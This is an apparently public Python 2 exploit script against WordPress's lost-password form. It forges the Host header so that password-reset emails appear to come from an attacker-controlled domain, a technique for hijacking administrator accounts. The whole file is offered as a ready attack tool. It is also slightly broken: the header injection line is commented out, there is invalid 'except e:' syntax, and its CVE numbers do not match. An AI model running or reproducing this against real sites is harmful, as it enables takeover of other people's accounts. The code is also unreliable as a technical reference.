try:
	import requests
except e:
        print "You need requests module for this exploit to work!"
        print "pip install requests"

# Option parsers
from optparse import OptionParser
parser = OptionParser()
parser.add_option("-t", "--target", dest="target", help="Wordpress Site Target URL (http://www.example.org/worpdress/)")
parser.add_option("-f", "--from", dest="from", help="Domain to set for the wordpress@domain hijack")
(options, args) = parser.parse_args()
option_dict = vars(options)

required="target from".split()
for r in required:
    if options.__dict__[r] is None:
        parser.error("parameter --%s required"%r)

# Set vars
from_user = option_dict['from']
url = option_dict['target'] + "wp-login.php?action=lostpassword"

# Exploit time!
print "=================="
print "Vuln: CVE-2017-8296"
print "Discovered by: Dawid Golunski (@dawid_golunski)"
print "Exploit by: mdiazcl (@mdiazcl)"
print "Read more at: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html"
print "=================="
print ""
print "Starting..."
print "Setting up payload variables"
print " + Target: {0}".format(url)
print " + From (attacker email): wordpress@{0}".format(from_user)
print "----"

# Setting headers
headers = requests.utils.default_headers()
head_data = {
        "Host": from_user,
        "Content-Type" : "application/x-www-form-urlencoded",
        "Content-Length" : "56",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36",
}
#headers.update(head_data)
# Launch Attack
print "Launching request..."
send = requests.post(url, headers=headers)
code = send.status_code

# Check
print ""
print "======================"
if code == 200:
        print "Code 200 OK returned!"
        print "Exploit launched successfully!"
        print "Remember that this will only work if the victim's email Mailserver or Inbox has problems!"
        print "Best of luck!"
else:
        print "Got {0} from te server.".format(code)
        print "Something went wrong :("
print "====================="

